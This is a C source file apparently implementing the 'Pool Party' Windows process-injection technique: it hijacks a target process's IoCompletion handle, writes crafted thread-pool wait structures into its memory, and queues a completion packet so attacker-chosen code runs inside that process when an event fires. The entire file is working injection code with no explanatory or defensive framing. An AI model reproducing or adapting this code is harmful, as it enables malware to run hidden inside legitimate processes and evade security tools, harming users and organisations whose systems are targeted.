#include "pool_party.h"
#include "pool_party_ext.h"

pNtDll* pNtDll_Init() {
	BOOL bError = FALSE;
	HANDLE hHeap = GetProcessHeap();
	pNtDll* ntdll = NULL;
	bError = (hHeap == NULL);
	if (!bError) {
		ntdll = (pNtDll*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(pNtDll));
		bError = ntdll == NULL;
		if (!bError) {
			HMODULE hNtDll = LoadLibraryA("ntdll.dll");

			// Hijack Handles
			ntdll->pNtQueryInformationProcess = (NTSTATUS(NTAPI*)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtDll, "NtQueryInformationProcess");
			ntdll->pNtQueryObject = (NTSTATUS(NTAPI*)(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtDll, "NtQueryObject");

			// Remote TP Wait Insertion
			ntdll->pZwAssociateWaitCompletionPacket = (NTSTATUS(NTAPI*)(HANDLE, HANDLE, HANDLE, PVOID, PVOID, NTSTATUS, ULONG_PTR, PBOOLEAN))GetProcAddress(hNtDll, "ZwAssociateWaitCompletionPacket"); // WIN 11, WIN 10(?)

			// Remote TP Direct Insertion
			
			ntdll->pZwSetIoCompletion = (NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, NTSTATUS, ULONG_PTR))GetProcAddress(hNtDll, "ZwSetIoCompletion"); // WIN7
			
			//ntdll->pZwSetInformationFile = (NTSTATUS(NTAPI*)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, ULONG))GetProcAddress(hNtDll, "ZwSetInformationFile"); // WIN7
			//ntdll->pNtAlpcCreatePort = (NTSTATUS(NTAPI*)(PHANDLE, POBJECT_ATTRIBUTES, PALPC_PORT_ATTRIBUTES))GetProcAddress(hNtDll, "NtAlpcCreatePort"); // WIN7
			//ntdll->pNtAlpcSetInformation = (NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG))GetProcAddress(hNtDll, "NtAlpcSetInformation"); // WIN7
			//ntdll->pNtAlpcConnectPort = (NTSTATUS(NTAPI*)(PHANDLE, PUNICODE_STRING, POBJECT_ATTRIBUTES, PALPC_PORT_ATTRIBUTES, DWORD, PSID, PPORT_MESSAGE, PSIZE_T, PALPC_MESSAGE_ATTRIBUTES, PALPC_MESSAGE_ATTRIBUTES, PLARGE_INTEGER))GetProcAddress(hNtDll, "NtAlpcConnectPort"); // WIN7
			//ntdll->pRtlAdjustPrivilege = (NTSTATUS(NTAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))GetProcAddress(hNtDll, "RtlAdjustPrivilege"); // WIN7
			//ntdll->pNtSetTimer2 = (NTSTATUS(NTAPI*)(HANDLE, PLARGE_INTEGER, PLARGE_INTEGER, PT2_SET_PARAMETERS))GetProcAddress(hNtDll, "NtSetTimer2"); // WIN 10(?)
			//ntdll->pNtTpAllocAlpcCompletion = (NTSTATUS(NTAPI*)(PVOID, HANDLE, PVOID, PVOID, PVOID))GetProcAddress(hNtDll, "TpAllocAlpcCompletion"); // WIN7
			//ntdll->pTpAllocJobNotification = (NTSTATUS(NTAPI*)(PVOID, HANDLE, PVOID, PVOID, PVOID))GetProcAddress(hNtDll, "TpAllocJobNotification"); // WIN 10
			//ntdll->pNtQueryInformationWorkerFactory = (NTSTATUS(NTAPI*)(HANDLE, _WORKERFACTORYINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtDll, "NtQueryInformationWorkerFactory"); // WIN 7
			//ntdll->pNtSetInformationWorkerFactory = (NTSTATUS(NTAPI*)(HANDLE, _WORKERFACTORYINFOCLASS, PVOID, ULONG))GetProcAddress(hNtDll, "NtSetInformationWorkerFactory"); // WIN7
		}
	}

	// Ensure every function is resolved.
	if (!bError && ntdll != NULL) {
		DWORD dwNumOfFunction = sizeof(pNtDll) / sizeof(PVOID);
		PVOID* p_ntdll = (PVOID*)ntdll;
		for (DWORD i = 0; i < dwNumOfFunction; i++) {
			if (p_ntdll[i] == NULL) {
				bError = TRUE;
				break;
			}
		}
		if (bError) {
			HeapFree(hHeap, MEM_RELEASE, ntdll);
			ntdll = NULL;
		}
	}
	return ntdll;
}


DWORD remote_tp_wait_insertion(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE *hTriggerHandle) {
	BOOL bError = FALSE;
	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
	ULONG dwInformationSizeIn = 1;
	ULONG dwInformationSizeOut = 0;
	PPROCESS_HANDLE_SNAPSHOT_INFORMATION lpProcessInfo = NULL;
	PPUBLIC_OBJECT_TYPE_INFORMATION lpObjectInfo = NULL;
	BOOL bFound = FALSE;

	pNtDll* ntdll = pNtDll_Init();
	if (ntdll == NULL) return 0;

	HANDLE hHeap = GetProcessHeap();
	HANDLE hCurrProcess = GetCurrentProcess();

	lpProcessInfo = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwInformationSizeIn);
	while (ntdll->pNtQueryInformationProcess(hProcess, ProcessHandleInformation, lpProcessInfo, dwInformationSizeIn, &dwInformationSizeOut) == 0xC0000004L) {
		if (dwInformationSizeIn != dwInformationSizeOut) {
			lpProcessInfo = HeapReAlloc(hHeap, 0, lpProcessInfo, dwInformationSizeOut);
			dwInformationSizeIn = dwInformationSizeOut;
		}
	}
	dwInformationSizeIn = 1024;
	dwInformationSizeOut = 0;
	lpObjectInfo = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwInformationSizeIn);
	for (ULONG i = 0; i < lpProcessInfo->NumberOfHandles; i++) {
		DuplicateHandle(hProcess, lpProcessInfo->Handles[i].HandleValue, hCurrProcess, &hHijackHandle, IO_COMPLETION_ALL_ACCESS, FALSE, 0);
		ntdll->pNtQueryObject(hHijackHandle, ObjectTypeInformation, lpObjectInfo, dwInformationSizeIn, &dwInformationSizeOut);
		if (dwInformationSizeIn > dwInformationSizeOut) {
			if (lstrcmpW(L"IoCompletion", lpObjectInfo->TypeName.Buffer) == 0) {
				bFound = TRUE;
				break;
			}
		}
		hHijackHandle = INVALID_HANDLE_VALUE;
	}
	PFULL_TP_WAIT hThreadPool = (PFULL_TP_WAIT)CreateThreadpoolWait((PTP_WAIT_CALLBACK)(lpStartAddress), lpParameter, NULL);
	PFULL_TP_WAIT pRemoteTpWait = VirtualAllocEx(hProcess, NULL, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	WriteProcessMemory(hProcess, pRemoteTpWait, hThreadPool, sizeof(FULL_TP_WAIT), NULL);

	PTP_DIRECT pRemoteTpDirect = VirtualAllocEx(hProcess, NULL, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	WriteProcessMemory(hProcess, pRemoteTpDirect, &hThreadPool->Direct, sizeof(TP_DIRECT), NULL);
	HANDLE hEvent = CreateEventA(NULL, FALSE, FALSE, "TO_MAKE_RANDOM"); // TODO: Make it random
	ntdll->pZwAssociateWaitCompletionPacket(hThreadPool->WaitPkt, hHijackHandle, hEvent, pRemoteTpDirect, pRemoteTpWait, 0, 0, NULL);
	
	*hTriggerHandle = hEvent;

	HeapFree(hHeap, 0, lpObjectInfo);
	HeapFree(hHeap, 0, lpProcessInfo);
	HeapFree(hHeap, 0, ntdll);
	return 0;
}